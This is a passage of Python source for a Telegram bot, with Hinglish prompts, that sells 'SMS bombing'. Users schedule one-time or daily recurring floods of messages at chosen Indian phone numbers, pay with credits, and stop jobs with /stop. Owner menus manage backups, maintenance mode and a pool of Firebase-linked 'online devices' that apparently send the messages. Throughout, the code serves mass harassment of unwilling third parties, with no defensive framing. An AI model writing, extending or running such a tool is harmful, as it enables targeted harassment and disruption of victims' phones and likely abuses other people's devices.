async def schedule_custom_get_number(msg: Message, state: FSMContext):
    phone = extract_indian_number(msg.text.strip())
    if not phone:
        await msg.reply("❌ Invalid.", parse_mode="Markdown"); return
    await state.update_data(sc_phone=phone)
    await state.set_state(S.schedule_custom_time)
    await msg.reply(f"✅ `{phone}`\n\n⏰ *Step 2/5: Time?*\nFormat: `HH:MM` IST", parse_mode="Markdown")


@R.message(S.schedule_custom_time)
async def schedule_custom_get_time(msg: Message, state: FSMContext):
    text = msg.text.strip()
    if not re.match(r'^\d{1,2}:\d{2}$', text):
        await msg.reply("❌ Format: `HH:MM`", parse_mode="Markdown"); return
    try:
        parts = text.split(":")
        target_hour = int(parts[0]); target_min = int(parts[1])
        if target_hour < 0 or target_hour > 23 or target_min < 0 or target_min > 59:
            raise ValueError
    except:
        await msg.reply("❌ Invalid time!", parse_mode="Markdown"); return
    now_ist = ist_now()
    target_ist = now_ist.replace(hour=target_hour, minute=target_min, second=0, microsecond=0)
    if target_ist <= now_ist:
        target_ist = target_ist + timedelta(days=1)
        is_tomorrow = True
    else:
        is_tomorrow = False
    delay_seconds = int((target_ist - now_ist).total_seconds())
    if delay_seconds < 30:
        await msg.reply("⚠️ Min 30 second baad.", parse_mode="Markdown"); return
    await state.update_data(sc_delay=delay_seconds, sc_hour=target_hour,
                            sc_min=target_min, sc_tomorrow=is_tomorrow)
    await state.set_state(S.schedule_custom_message)
    tomorrow_str = " (ᴋᴀʟ)" if is_tomorrow else ""
    await msg.reply(f"✅ Time: `{target_hour:02d}:{target_min:02d}` IST{tomorrow_str}\n\n"
        f"💬 *Step 3/5: Message bhejo*", parse_mode="Markdown")


@R.message(S.schedule_custom_message)
async def schedule_custom_get_message(msg: Message, state: FSMContext):
    message_text = msg.text.strip()
    if not message_text:
        await msg.reply("❌ Empty!", parse_mode="Markdown"); return
    await state.update_data(sc_message=message_text)
    await state.set_state(S.schedule_custom_speed)
    await msg.reply(f"✅ Message saved!\n\n⚡ *Step 4/5: Speed choose karo*",
        reply_markup=speed_kb("schedule"), parse_mode="Markdown")


@R.message(S.schedule_custom_count)
async def schedule_custom_get_count(msg: Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.reply("❌ Valid number.", parse_mode="Markdown"); return
    fsmd = await state.get_data()
    phone = fsmd.get("sc_phone"); delay = fsmd.get("sc_delay")
    target_hour = fsmd.get("sc_hour"); target_min = fsmd.get("sc_min")
    is_tomorrow = fsmd.get("sc_tomorrow", False)
    message_text = fsmd.get("sc_message"); speed = fsmd.get("sc_speed", SPEED_DEFAULT)
    uid = msg.from_user.id
    d = load()
    sid = str(int(time.time())) + str(random.randint(100, 999))
    run_at = time.time() + delay
    scheduled_bombs[sid] = {
        "user_id": uid, "bomb_type": "custom_sms", "phone": phone,
        "message": message_text, "speed": speed, "count": count,
        "run_at": run_at, "created_at": time.time(), "running": False
    }
    d["scheduled_bombs"] = scheduled_bombs
    save(d)
    await state.clear()
    start_ist = ist_from_timestamp(int(run_at), "%d/%m/%Y %I:%M:%S %p")
    tomorrow_str = " (ᴋᴀʟ)" if is_tomorrow else ""
    await msg.reply(
        f"✅ *CUSTOM SMS SCHEDULED!*\n📱 `{phone}`\n"
        f"🕐 `{target_hour:02d}:{target_min:02d}`{tomorrow_str}\n"
        f"📅 `{start_ist}`\n🔢 `{count}` SMS",
        parse_mode="Markdown")


# ================= RECURRING BOMB (TYPE CHOOSER) =================
@R.callback_query(F.data.in_({"user:recurring", "owner:recurring", "admin:recurring"}))
async def recurring_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not can_use(uid, d):
        await cq.answer("⛔ No access!", show_alert=True); return
    if is_owner(uid, d): back = "owner:home"
    elif is_admin(uid, d): back = "admin:home"
    else: back = "user:home"
    await state.set_state(S.recurring_bomb_type)
    try:
        await cq.message.edit_text(
            f"🔁 <b>RECURRING SCHEDULE</b>\n"
            f"🕐 IST: <code>{ist_time_str()}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"<b>Kaunsa bomb daily chalana hai?</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [btn("📤 ᴄᴜsᴛᴏᴍ sᴍs", "recurring:type:custom", EMOJI_ROCKET, "📤")],
                [btn("💥 ᴄʟᴀssɪᴄ ʙᴏᴍʙ", "recurring:type:classic", EMOJI_FIRE, "💥")],
                [btn("ᴄᴀɴᴄᴇʟ", back, EMOJI_CROSS, "❌")]
            ]),
            parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "recurring:type:custom")
async def recurring_choose_custom(cq: CallbackQuery, state: FSMContext):
    await state.update_data(bomb_type="custom_sms")
    await state.set_state(S.recurring_custom_number)
    try:
        await cq.message.edit_text(f"📤 <b>CUSTOM SMS RECURRING</b>\n\n<b>Step 1/5:</b> Phone number bhejo",
            reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "recurring:type:classic")
async def recurring_choose_classic(cq: CallbackQuery, state: FSMContext):
    await state.update_data(bomb_type="classic")
    await state.set_state(S.recurring_phone)
    try:
        await cq.message.edit_text(f"💥 <b>CLASSIC BOMB RECURRING</b>\n\n<b>Step 1/3:</b> Phone number bhejo",
            reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")
    except: pass


@R.message(S.recurring_phone)
async def recurring_get_phone(msg: Message, state: FSMContext):
    phone = extract_indian_number(msg.text.strip())
    if not phone:
        await msg.reply("❌ Invalid!", parse_mode="Markdown"); return
    await state.update_data(rec_phone=phone)
    await state.set_state(S.recurring_time)
    await msg.reply(
        f"✅ `{phone}`\n\n"
        f"⏰ *Step 2/3: Time of day?*\nFormat: `HH:MM` IST\n<i>Example: 10:00 (roz 10 AM)</i>",
        parse_mode="Markdown")


@R.message(S.recurring_time)
async def recurring_get_time(msg: Message, state: FSMContext):
    text = msg.text.strip()
    if not re.match(r'^\d{1,2}:\d{2}$', text):
        await msg.reply("❌ Format: `HH:MM`", parse_mode="Markdown"); return
    try:
        parts = text.split(":")
        hh = int(parts[0]); mm = int(parts[1])
        if hh < 0 or hh > 23 or mm < 0 or mm > 59:
            raise ValueError
    except:
        await msg.reply("❌ Invalid!", parse_mode="Markdown"); return
    time_of_day = f"{hh:02d}:{mm:02d}"
    await state.update_data(rec_time=time_of_day)
    await state.set_state(S.recurring_cycles)
    await msg.reply(f"✅ Time: `{time_of_day}` IST roz\n\n🔁 *Step 3/3: Cycles?*\n<i>1 cycle = 10 min</i>",
        parse_mode="Markdown")


@R.message(S.recurring_cycles)
async def recurring_get_cycles(msg: Message, state: FSMContext):
    try:
        cycles = int(msg.text.strip())
        if cycles < 1: raise ValueError
    except:
        await msg.reply("❌ Valid number.", parse_mode="Markdown"); return
    fsmd = await state.get_data()
    phone = fsmd.get("rec_phone")
    time_of_day = fsmd.get("rec_time")
    uid = msg.from_user.id
    d = load()
    sid = "REC" + str(int(time.time())) + str(random.randint(100, 999))
    recurring_schedules[sid] = {
        "user_id": uid, "bomb_type": "classic", "phone": phone, "cycles": cycles,
        "time_of_day": time_of_day, "last_run_date": "", "created_at": time.time()
    }
    d["recurring"] = recurring_schedules
    save(d)
    await state.clear()
    await msg.reply(
        f"✅ *RECURRING CLASSIC BOMB SAVED!*\n━━━━━━━━━━━━━━━\n"
        f"💥 Type: Classic Bomb\n📱 `{phone}`\n"
        f"🕐 Roz `{time_of_day}` IST\n🔁 `{cycles}` cycles\n"
        f"━━━━━━━━━━━━━━━\n\n💡 Daily auto-trigger! /stop se cancel",
        parse_mode="Markdown")


@R.message(S.recurring_custom_number)
async def recurring_custom_get_number(msg: Message, state: FSMContext):
    phone = extract_indian_number(msg.text.strip())
    if not phone:
        await msg.reply("❌ Invalid!", parse_mode="Markdown"); return
    await state.update_data(rc_phone=phone)
    await state.set_state(S.recurring_custom_time)
    await msg.reply(f"✅ `{phone}`\n\n⏰ *Step 2/5: Roz kis time pe?*\nFormat: `HH:MM` IST",
        parse_mode="Markdown")


@R.message(S.recurring_custom_time)
async def recurring_custom_get_time(msg: Message, state: FSMContext):
    text = msg.text.strip()
    if not re.match(r'^\d{1,2}:\d{2}$', text):
        await msg.reply("❌ Format: `HH:MM`", parse_mode="Markdown"); return
    try:
        parts = text.split(":")
        hh = int(parts[0]); mm = int(parts[1])
        if hh < 0 or hh > 23 or mm < 0 or mm > 59:
            raise ValueError
    except:
        await msg.reply("❌ Invalid!", parse_mode="Markdown"); return
    time_of_day = f"{hh:02d}:{mm:02d}"
    await state.update_data(rc_time=time_of_day)
    await state.set_state(S.recurring_custom_message)
    await msg.reply(f"✅ Time: `{time_of_day}` IST\n\n💬 *Step 3/5: Message bhejo*", parse_mode="Markdown")


@R.message(S.recurring_custom_message)
async def recurring_custom_get_message(msg: Message, state: FSMContext):
    message_text = msg.text.strip()
    if not message_text:
        await msg.reply("❌ Empty!", parse_mode="Markdown"); return
    await state.update_data(rc_message=message_text)
    await state.set_state(S.recurring_custom_speed)
    await msg.reply(f"✅ Message saved!\n\n⚡ *Step 4/5: Speed choose karo*",
        reply_markup=speed_kb("recurring"), parse_mode="Markdown")


@R.callback_query(F.data.in_({"recurring:speed:fast", "recurring:speed:medium", "recurring:speed:slow"}))
async def recurring_custom_get_speed(cq: CallbackQuery, state: FSMContext):
    speed_map = {"recurring:speed:fast": SPEED_FAST, "recurring:speed:medium": SPEED_MEDIUM, "recurring:speed:slow": SPEED_SLOW}
    selected = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected == SPEED_FAST else "⚡ MEDIUM" if selected == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(rc_speed=selected)
    await state.set_state(S.recurring_custom_count)
    try:
        await cq.message.edit_text(
            f"{speed_label} <b>selected!</b>\n\n🔢 *Step 5/5: Kitne SMS bhejna hai?*",
            reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
            parse_mode="HTML")
    except: pass


@R.message(S.recurring_custom_count)
async def recurring_custom_get_count(msg: Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.reply("❌ Valid number.", parse_mode="Markdown"); return
    fsmd = await state.get_data()
    phone = fsmd.get("rc_phone"); time_of_day = fsmd.get("rc_time")
    message_text = fsmd.get("rc_message"); speed = fsmd.get("rc_speed", SPEED_DEFAULT)
    uid = msg.from_user.id
    d = load()
    deduct = should_deduct_credits(uid, d)
    credit_msg = ""
    if deduct:
        have = get_user_credits(uid, d)
        if have < count:
            await state.clear()
            await msg.reply(f"❌ *Insufficient credits!*\nPer day: `{count}`\nYou have: `{have}`", parse_mode="Markdown")
            return
        deduct_credits(uid, count, d)
        save(d)
        credit_msg = f"💰 Day 1 deducted: `{count}`"
    else:
        credit_msg = "🎫 Valid: No deduction ✅" if has_active_validity(uid, d) else "💰 Admin/Owner"
    sid = "REC" + str(int(time.time())) + str(random.randint(100, 999))
    recurring_schedules[sid] = {
        "user_id": uid, "bomb_type": "custom_sms", "phone": phone,
        "message": message_text, "speed": speed, "count": count,
        "time_of_day": time_of_day, "last_run_date": "", "created_at": time.time()
    }
    d["recurring"] = recurring_schedules
    save(d)
    await state.clear()
    await msg.reply(
        f"✅ *RECURRING CUSTOM SMS SAVED!*\n━━━━━━━━━━━━━━━\n"
        f"📤 Type: Custom SMS\n📱 `{phone}`\n"
        f"🕐 Roz `{time_of_day}` IST\n💬 `{message_text[:50]}`\n"
        f"🔢 `{count}` SMS/day\n{credit_msg}\n"
        f"━━━━━━━━━━━━━━━\n\n💡 Daily auto-trigger!",
        parse_mode="Markdown")


# ================= STOP COMMAND =================
@R.message(Command("stop"))
async def stop_bomb_cmd(message: Message):
    user_id = message.from_user.id
    stopped = False
    if user_id in active_classic_bombings:
        active_classic_bombings[user_id] = False
        stopped = True
    for sid, sb in list(scheduled_bombs.items()):
        if sb["user_id"] == user_id:
            del scheduled_bombs[sid]; stopped = True
    for sid, rs in list(recurring_schedules.items()):
        if rs["user_id"] == user_id:
            del recurring_schedules[sid]; stopped = True
    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(user_id)
        if session and session.task and not session.task.done():
            session.cancelled = True; stopped = True
    if stopped:
        await message.reply("🛑 All bombings/schedules stopped!", parse_mode="Markdown")
    else:
        await message.reply("❌ Koi active bomb nahi!", parse_mode="Markdown")


# ================= MAINTENANCE MODE (OWNER) =================
@R.callback_query(F.data == "owner:maintenance")
async def owner_maintenance_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    m = d.get("maintenance", {})
    status = "🔴 ON" if m.get("enabled") else "🟢 OFF"
    msg = m.get("message", "No message set")
    eta = m.get("eta", "Not set")
    text = (f"🛠 <b>MAINTENANCE MODE</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"Status: {status}\n\n"
            f"💬 Message: <i>{msg[:100]}</i>\n"
            f"⏰ ETA: <b>{eta if eta else 'Not set'}</b>\n")
    rows = [
        [InlineKeyboardButton(text=("🟢 Enable" if not m.get("enabled") else "🔴 Disable"), callback_data="owner:maintenance:toggle")],
        [btn("✏️ sᴇᴛ ᴍᴇssᴀɢᴇ", "owner:maintenance:msg", EMOJI_GEAR, "✏️")],
        [btn("⏰ sᴇᴛ ᴇᴛᴀ", "owner:maintenance:eta", EMOJI_WARNING, "⏰")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:maintenance:toggle")
async def owner_maintenance_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    m = d.setdefault("maintenance", {"enabled": False, "message": "", "eta": ""})
    m["enabled"] = not m.get("enabled", False)
    if not m["enabled"]:
        m["auto_resume_at"] = 0
    save(d)
    status = "ENABLED" if m["enabled"] else "DISABLED"
    await cq.answer(f"✅ Maintenance {status}!", show_alert=True)
    await owner_maintenance_menu(cq, state)


@R.callback_query(F.data == "owner:maintenance:msg")
async def owner_maintenance_msg_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.maintenance_message)
    await cq.message.edit_text(
        f"✏️ <b>Set Maintenance Message</b>\n\nJo message users ko dikhana hai woh bhejo:\n\n"
        f"<i>Example: Bot update ho raha hai. 30 min me wapas.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:maintenance")]), parse_mode="HTML")


@R.message(S.maintenance_message)
async def owner_maintenance_msg_set(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    text = msg.text.strip()[:300]
    d.setdefault("maintenance", {})["message"] = text
    save(d)
    await state.clear()
    await msg.answer(f"✅ Message saved!", reply_markup=kb([(f"{sc('back')}", "owner:maintenance")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:maintenance:eta")
async def owner_maintenance_eta_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.maintenance_eta)
    await cq.message.edit_text(
        f"⏰ <b>Set ETA</b>\n\nKab tak maintenance khatam hoga? (text form)\n\n"
        f"<i>Example: 30 minutes / 2 hours</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:maintenance")]), parse_mode="HTML")


@R.message(S.maintenance_eta)
async def owner_maintenance_eta_set(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    eta = msg.text.strip()[:100]
    d.setdefault("maintenance", {})["eta"] = eta
    save(d)
    await state.clear()
    await msg.answer(f"✅ ETA saved: {eta}", reply_markup=kb([(f"{sc('back')}", "owner:maintenance")]), parse_mode="HTML")


# ================= FIREBASE HEALTH MONITOR =================
@R.callback_query(F.data == "owner:fb_health")
async def owner_fb_health(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    fbs = d.get("firebases", [])
    health = d.get("firebase_health", {})
    now = int(time.time())
    if not fbs:
        try:
            await cq.message.edit_text(f"🔥 <b>FIREBASE HEALTH</b>\n\n❌ Koi firebase nahi added.",
                reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        except: pass
        return
    text = f"🔥 <b>FIREBASE HEALTH MONITOR</b>\n━━━━━━━━━━━━━━━━━━\n\n"
    total_online = 0
    for fb in fbs:
        fb_id = fb["id"]
        label = fb.get("label", fb["url"][:30])
        info = FB_DEVICE_COUNTS.get(fb_id, {})
        online = info.get("online", 0)
        last_update = info.get("last_update", 0)
        total_online += online
        if online > 0: status = "🟢 Healthy"
        elif last_update > 0 and (now - last_update) < 600: status = "🟡 Slow"
        else: status = "🔴 Offline"
        h = health.get(fb_id, {})
        last_seen = h.get("last_seen_online", 0)
        if last_seen > 0:
            ago = now - last_seen
            if ago < 60: ago_str = f"{ago}s ago"
            elif ago < 3600: ago_str = f"{ago // 60}m ago"
            elif ago < 86400: ago_str = f"{ago // 3600}h ago"
            else: ago_str = f"{ago // 86400}d ago"
        else:
            ago_str = "Never"
        text += f"{status} <b>{label[:25]}</b>\n"
        text += f"   📱 Online: <b>{online}</b> devices\n"
        text += f"   ⏰ Last seen: {ago_str}\n\n"
    text += f"━━━━━━━━━━━━━━━━━━\n📊 Total Online Devices: <b>{total_online}</b>"
    if len(text) > 4000:
        text = text[:3950] + "\n<i>...truncated</i>"
    rows = [
        [btn("🧹 ᴀᴜᴛᴏ-ᴄʟᴇᴀɴ ᴅᴇᴀᴅ", "owner:fb_health:clean", EMOJI_CROSS, "🧹")],
        [btn("ʀᴇғʀᴇsʜ", "owner:fb_health", EMOJI_GEAR, "🔄")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:fb_health:clean")
async def owner_fb_health_clean(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    now = int(time.time())
    health = d.get("firebase_health", {})
    dead_ids = []
    for fb_id, h in health.items():
        last_seen = h.get("last_seen_online", 0)
        if last_seen > 0 and (now - last_seen) > (7 * 86400):
            dead_ids.append(fb_id)
    if not dead_ids:
        await cq.answer("✅ Koi dead firebase nahi!", show_alert=True); return
    removed_labels = []
    for fb in d.get("firebases", []):
        if fb["id"] in dead_ids:
            removed_labels.append(fb.get("label", fb["url"][:30]))
    d["firebases"] = [fb for fb in d.get("firebases", []) if fb["id"] not in dead_ids]
    for did in dead_ids:
        health.pop(did, None)
    d["firebase_health"] = health
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    for did in dead_ids:
        FB_DEVICE_COUNTS.pop(did, None)
    CACHED_DEVICES = [dv for dv in CACHED_DEVICES if dv.get("fb_id") not in dead_ids]
    save(d)
    lines = "\n".join(f"• {lbl[:30]}" for lbl in removed_labels)
    await cq.answer(f"🧹 {len(dead_ids)} dead firebase removed!", show_alert=True)
    try:
        await cq.message.edit_text(
            f"🧹 <b>CLEANED!</b>\n\nRemoved <b>{len(dead_ids)}</b> dead firebases:\n{lines}",
            reply_markup=kb([(f"{sc('back')}", "owner:fb_health")]), parse_mode="HTML")
    except: pass


# ================= BACKUP UI =================
@R.callback_query(F.data == "owner:backup")
async def owner_backup_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    if os.path.exists(_DATA_FILE):
        file_size = os.path.getsize(_DATA_FILE)
        size_str = f"{file_size / 1024:.1f} KB" if file_size < 1024*1024 else f"{file_size / (1024*1024):.1f} MB"
    else:
        size_str = "N/A"
    users_count = len(d.get("users", {}))
    total_sent = d.get("stats", {}).get("total_sent", 0)
    text = (f"💾 <b>BACKUP SYSTEM</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 Current File Size: <b>{size_str}</b>\n"
            f"👥 Total Users: <b>{users_count}</b>\n"
            f"📤 Total SMS: <b>{total_sent}</b>\n\n"
            f"⏰ <b>Auto Backup:</b> Every 6 hours\n"
            f"📥 Backup aapke DM me aata hai\n\n"
            f"👇 Manual backup click karein:")
    rows = [
        [btn("💾 ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏᴡ", "owner:backup:manual", EMOJI_CHECK, "💾")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:backup:manual")
async def owner_backup_manual(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await cq.answer("💾 Generating backup...", show_alert=True)
    try:
        if os.path.exists(_DATA_FILE):
            file_size = os.path.getsize(_DATA_FILE)
            size_str = f"{file_size / 1024:.1f} KB" if file_size < 1024*1024 else f"{file_size / (1024*1024):.1f} MB"
            users_count = len(d.get("users", {}))
            total_sent = d.get("stats", {}).get("total_sent", 0)
            credits_total = sum(u.get("credits", 0) for u in d.get("users", {}).values())
            now = ist_now()
            backup_name = f"blast5_manual_{now.strftime('%Y-%m-%d_%H-%M')}.json"
            caption = (
                f"💾 <b>MANUAL BACKUP</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"📅 <code>{now.strftime('%d/%m/%Y %H:%M')} IST</code>\n"
                f"📊 Size: <b>{size_str}</b>\n"
                f"👥 Users: <b>{users_count}</b>\n"
                f"📤 SMS: <b>{total_sent}</b>\n"
                f"💰 Credits: <b>{credits_total}</b>"
            )
            file_input = FSInputFile(_DATA_FILE, filename=backup_name)
            await cq.message.answer_document(file_input, caption=caption, parse_mode="HTML")
    except Exception as e:
        log.error(f"Manual backup: {e}")
        await cq.answer(f"❌ Error: {str(e)[:50]}", show_alert=True)


# ================= VIDEOS =================
@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    try:
        await cq.message.edit_text(
            f"📹 <b>Video Manager</b>\n\nTotal: <b>{len(d.get('videos', []))}</b>",
            reply_markup=videos_menu_kb(d), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_video)
    await cq.message.edit_text(f"📹 <b>Add Video</b>\n\nVideo bhejo ya URL/FileID:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]), parse_mode="HTML")


@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear(); return
    vid = None
    if msg.video: vid = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
        vid = msg.document.file_id
    elif msg.text: vid = msg.text.strip()
    if not vid:
        await msg.answer(f"❌ Valid video bhejo.", parse_mode="HTML"); return
    d.setdefault("videos", []).append(vid)
    save(d)
    await state.clear()
    await msg.answer(f"✅ Saved!", reply_markup=videos_menu_kb(load()), parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    idx = int(cq.data.split(":")[-1])
    videos = d.get("videos", [])
    if 0 <= idx < len(videos):
        videos.pop(idx)
        d["videos"] = videos
        save(d)
        await cq.answer("🗑 Removed!")
    await owner_videos_menu(cq, state)


@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    d["videos"] = []
    save(d)
    await cq.answer("🗑 All deleted!", show_alert=True)
    await owner_videos_menu(cq, state)


@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not d.get("videos"):
        await cq.answer("❌ No videos!", show_alert=True); return
    await cq.answer("📹 Sending...")
    await send_random_video(cq.bot, cq.message.chat.id, caption="📹 Enjoy!")


# ================= FIREBASE MENU =================
@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.clear()
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0
    try:
        await cq.message.edit_text(
            f"🔥 <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b>",
            reply_markup=fb_menu_kb(d, page), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"🔥 <b>Add Firebase</b>\n\nFormat: <code>Label | URL</code>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]), parse_mode="HTML")


@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    text = msg.text.strip()
    if "|" in text:
        label, url = text.split("|", 1)
        label = label.strip(); url = url.strip()
    else:
        url = text; label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer(f"❌ URL must start with http", parse_mode="HTML"); return
    url = url.rstrip("/")
    if any(fb["url"] == url for fb in d.get("firebases", [])):
        await state.clear()
        await msg.answer(f"⚠️ Already!", reply_markup=fb_menu_kb(d), parse_mode="HTML")
        return
    d.setdefault("firebases", []).append({"id": str(int(time.time())), "url": url, "label": label, "added_at": int(time.time())})
    save(d)
    await state.clear()
    await msg.answer(f"✅ Added!", reply_markup=fb_menu_kb(load()), parse_mode="HTML")


@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(
        f"🔥 <b>Bulk Add (TXT)</b>\n\nTXT file bhejo.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]), parse_mode="HTML")


@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    doc = msg.document
    if not doc.file_name.endswith('.txt'):
        await msg.answer(f"❌ .txt file!", parse_mode="HTML"); return
    fi = await msg.bot.get_file(doc.file_id)
    content = (await msg.bot.download_file(fi.file_path)).read().decode('utf-8', errors='ignore')
    fbs = d.get("firebases", [])
    existing = {fb["url"].rstrip("/") for fb in fbs}
    added = 0; skipped = 0
    for line in content.splitlines():
        line = line.strip()
        if not line: continue
        if "|" in line:
            label, url = line.split("|", 1); label = label.strip(); url = url.strip()
        else:
            url = line; label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]
        if not (url.startswith("http://") or url.startswith("https://")): continue
        url = url.rstrip("/")
        if url in existing:
            skipped += 1; continue
        existing.add(url)
        fbs.append({"id": str(int(time.time()*1000)+random.randint(100,999)), "url": url, "label": label, "added_at": int(time.time())})
        added += 1
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(f"✅ Added {added}, skipped {skipped}", reply_markup=fb_menu_kb(load()), parse_mode="HTML")


@R.message(S.add_firebase_file)
async def owner_fb_invalid(msg: Message):
    await msg.answer(f"❌ Send .txt file!", parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    parts = cq.data.split(":")
    fid = parts[3]; page = int(parts[4]) if len(parts) > 4 else 0
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fid]
    save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dv for dv in CACHED_DEVICES if dv.get("fb_id") != fid]
    FB_DEVICE_COUNTS.pop(fid, None)
    d.get("firebase_health", {}).pop(fid, None)
    save(d)
    await cq.answer("🗑", show_alert=True)
    d = load()
    try:
        await cq.message.edit_text(f"🔥 <b>Firebase</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
            reply_markup=fb_menu_kb(d, page), parse_mode="HTML")
    except: pass


# ================= OWNER STATS =================
@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await cq.answer("⏳")
    devices = get_cached_devices() or await get_all_online_devices(d)
    full = api_stats_text(d) + f"\n\n🟢 Online Devices: <b>{len(devices)}</b>"
